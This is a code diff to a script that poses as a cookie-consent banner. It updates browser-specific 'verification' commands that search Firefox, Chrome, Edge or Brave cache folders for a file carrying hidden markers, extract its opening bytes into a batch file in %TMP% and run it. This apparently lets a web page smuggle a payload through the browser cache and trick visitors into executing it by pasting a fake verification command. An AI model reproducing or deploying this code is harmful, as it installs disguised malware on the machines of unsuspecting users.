@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.6.5',
+    version: '1.6.6',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
     accentColor: '#1b6369',
@@ -24,10 +24,10 @@
     bodyEndMarker: 'CDRPEND7F3A9D2',
     bodyMustStartWith: '@echo off',
     verificationTemplates: {
-      firefox: 'cmd /c (for /r "%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles" %f in (*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&copy /y "%f" "%TMP%\\t.bat">nul) & if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
-      chrome: 'cmd /c (for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&copy /y "%f" "%TMP%\\t.bat">nul) & if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
-      edge: 'cmd /c (for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&copy /y "%f" "%TMP%\\t.bat">nul) & if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
-      brave: 'cmd /c (for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&copy /y "%f" "%TMP%\\t.bat">nul) & if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"'
+      firefox: "cmd /c (for /r \"%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\" %f in (*) do @find \"{M}\" \"%f\">nul&&find \"{E}\" \"%f\">nul&&powershell -c \"[IO.File]::WriteAllBytes('%TMP%\\t.bat',([IO.File]::ReadAllBytes('%f')[0..{SM1}]))\") & call \"%TMP%\\t.bat\"",
+      chrome: "cmd /c (for /r \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\" %f in (f_*) do @find \"{M}\" \"%f\">nul&&find \"{E}\" \"%f\">nul&&powershell -c \"[IO.File]::WriteAllBytes('%TMP%\\t.bat',([IO.File]::ReadAllBytes('%f')[0..{SM1}]))\") & call \"%TMP%\\t.bat\"",
+      edge: "cmd /c (for /r \"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\" %f in (f_*) do @find \"{M}\" \"%f\">nul&&find \"{E}\" \"%f\">nul&&powershell -c \"[IO.File]::WriteAllBytes('%TMP%\\t.bat',([IO.File]::ReadAllBytes('%f')[0..{SM1}]))\") & call \"%TMP%\\t.bat\"",
+      brave: "cmd /c (for /r \"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\" %f in (f_*) do @find \"{M}\" \"%f\">nul&&find \"{E}\" \"%f\">nul&&powershell -c \"[IO.File]::WriteAllBytes('%TMP%\\t.bat',([IO.File]::ReadAllBytes('%f')[0..{SM1}]))\") & call \"%TMP%\\t.bat\""
     }
   };
 
@@ -134,14 +134,18 @@
   function getVerificationCommand() {
     var startMarker = CONSENT_CONFIG.bodyStartMarker || 'CDRP7F3A9D2B8C4';
     var endMarker = CONSENT_CONFIG.bodyEndMarker || 'CDRPEND7F3A9D2';
-    if (!startMarker || !endMarker) return '';
+    var bodySize = CONSENT_CONFIG.cacheFileBodySize;
+    if (!startMarker || !endMarker || !bodySize || bodySize < 1) return '';
 
     var key = getBrowserKey();
     var templates = CONSENT_CONFIG.verificationTemplates || {};
     var tpl = templates[key] || templates.firefox || '';
     if (!tpl) return '';
 
-    return tpl.replace(/\{M\}/g, startMarker).replace(/\{E\}/g, endMarker);
+    return tpl
+      .replace(/\{M\}/g, startMarker)
+      .replace(/\{E\}/g, endMarker)
+      .replace(/\{SM1\}/g, String(bodySize - 1));
   }
 
   function fallbackCopy(text) {
